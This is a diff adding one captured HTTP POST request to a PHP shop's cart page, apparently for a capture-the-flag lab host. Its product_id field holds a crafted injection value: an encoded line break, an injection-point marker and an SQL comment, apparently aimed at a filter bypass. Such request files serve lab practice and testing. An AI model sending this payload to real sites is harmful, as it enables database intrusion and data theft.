@@ -1,0 +1,16 @@
+POST /shop/index.php?page=cart HTTP/1.1
+Host: 10.10.11.229
+Content-Length: 33
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.229
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.11.229/shop/index.php?page=product&id=2
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=im3krcd3emfm96hir41b6tmb1d
+Connection: close
+
+quantity=1&product_id=%0D%0A*--+1
